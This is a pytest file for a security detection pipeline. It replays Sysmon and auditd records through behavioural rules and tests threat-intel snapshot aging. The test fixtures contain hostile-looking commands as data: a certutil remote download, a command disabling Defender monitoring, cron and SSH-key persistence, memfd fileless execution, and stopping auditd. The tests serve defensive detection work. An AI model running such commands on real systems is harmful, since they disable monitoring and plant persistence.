# SPDX-FileCopyrightText: 2026 Ivan Rozenblad
# SPDX-License-Identifier: Apache-2.0

"""Replay each deployed detection through normalized source records."""

import hashlib
import json
from datetime import date
from pathlib import Path

import pytest

from agents.tools.behavior_runtime import load_behavioral_rules
from dashboard.intelligence_view import behavior_evidence, intel_status
from ingest import normalize
from intel import IntelStoreError, lookup_indicator
from intel.store import load_local_snapshot
from pipeline.cycle import run_cycle
from scripts.run_pipeline import _report
from store import EventStore


def _sysmon(image: str, command: str, parent: str = "explorer.exe") -> dict:
    return {
        "Provider": "Microsoft-Windows-Sysmon",
        "EventID": 1,
        "EventData": {"Image": image, "CommandLine": command, "ParentImage": parent},
    }


_RECORDS = (
    (_sysmon("cmd.exe", "cmd.exe", "WINWORD.EXE"), "office_app_spawns_shell"),
    (
        _sysmon("certutil.exe", "certutil -urlcache http://198.51.100.20/a"),
        "certutil_remote_download",
    ),
    (
        _sysmon("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring"),
        "security_tool_tamper_command",
    ),
    (
        'type=USER_CMD msg=audit(1755162662.451:1): cmd="echo @reboot > /etc/cron.d/lab"',
        "cron_reboot_persistence",
    ),
    (
        'type=USER_CMD msg=audit(1755162662.451:2): cmd="echo demo >> authorized_keys"',
        "ssh_authorized_keys_appended",
    ),
    (
        "type=SYSCALL msg=audit(1755162662.451:3): arch=c00000b7 syscall=281 "
        'success=yes exe="/memfd:lab (deleted)"',
        "memfd_fileless_execution",
    ),
    ("type=DAEMON_END msg=audit(1755162662.451:4): res=success", "auditd_stopped"),
)


@pytest.mark.parametrize(("raw", "expected"), _RECORDS)
def test_rules_match_typed_records(raw: str | dict, expected: str) -> None:
    rules = load_behavioral_rules()
    _, hits = rules.evaluate_event(normalize(raw))
    assert [rule.name for rule in hits] == [expected]


def test_unrelated_sysmon_id_and_failed_syscalls_do_not_verify_coverage() -> None:
    sysmon = _sysmon("cmd.exe", "cmd.exe", "WINWORD.EXE") | {"EventID": 11}
    audit = _RECORDS[5][0]
    assert isinstance(audit, str)
    for record in (
        sysmon,
        audit.replace("success=yes", "success=no"),
        audit.replace("c00000b7", "c000003e"),
        "memfd execution",
    ):
        assert load_behavioral_rules().evaluate_event(normalize(record)) == (set(), ())


def test_auditd_decodes_kernel_hex_path_and_proctitle() -> None:
    prefix = "type=SYSCALL msg=audit(1755162662.451:5): arch=c000003e syscall=322 success=yes"
    event = normalize(f"{prefix} exe={b'/memfd:lab (deleted)'.hex()}")
    assert event.activity == "memfd execution"
    command = "systemctl stop auditd".replace(" ", "\x00").encode().hex()
    event = normalize(f"{prefix} exe=/bin/systemctl proctitle={command}")
    assert event.actor.command_line == "systemctl stop auditd"
    assert load_behavioral_rules().evaluate_event(event)[1][0].name == (
        "security_tool_tamper_command"
    )


def test_pipeline_reports_new_hits_and_dashboard_observes_signals(tmp_path: Path) -> None:
    catalog = load_behavioral_rules()
    events = [normalize(raw) for raw, _ in _RECORDS]
    with EventStore.open(tmp_path) as store:
        ids = {store.append(event, ingested_at=100) for event in events}
        result = run_cycle(store, behavioral_rules=catalog)
        resumed = run_cycle(store, cursor=result.cursor, behavioral_rules=catalog)
    assert {hit.event_id for hit in result.detection_hits} == ids
    assert {hit.attack_version for hit in result.detection_hits} == {catalog.attack_version}
    assert not resumed.detection_hits
    assert _report(result, elapsed=0.1, advancing=True)["behavioral_detections"]
    signals, rows = behavior_evidence(events)
    assert len(signals) == 5
    assert len(rows) == 7


def test_pinned_snapshot_ages_without_synthetic_corroboration(tmp_path: Path) -> None:
    root = tmp_path / "data" / "intel"
    root.mkdir(parents=True)
    path = root / "snapshot.json"
    snapshot = {
        "sources": [
            {
                "source_id": "lab-feed",
                "name": "Lab feed",
                "url": "https://www.iana.org",
                "license": "CC0-1.0",
                "upstream": "iana.org",
                "retrieved": "2026-11-12",
            }
        ],
        "indicators": [
            {
                "type": "ipv4",
                "value": "203.0.113.66",
                "risk": "malicious",
                "confidence": "high",
                "source_id": "lab-feed",
                "first_seen": "2026-11-01",
                "retrieved": "2026-11-12",
                "expires": "2026-11-14",
                "tlp": "clear",
                "reference": "Lab fixture",
            }
        ],
    }
    raw = json.dumps(snapshot).encode()
    path.write_bytes(raw)
    pin = hashlib.sha256(raw).hexdigest()
    store = load_local_snapshot(tmp_path, sha256=pin)
    now = date(2026, 11, 13)
    assert len(store.atomic) == 1
    assert lookup_indicator(store, "203.0.113.66", as_of=now).risk == "suspicious"
    assert "local snapshot" in intel_status(as_of=now, local=store).detail
    assert "attention" in intel_status(as_of=date(2026, 11, 15), local=store).status
    path.write_bytes(raw + b" ")
    with pytest.raises(IntelStoreError, match="SHA-256"):
        load_local_snapshot(tmp_path, sha256=pin)
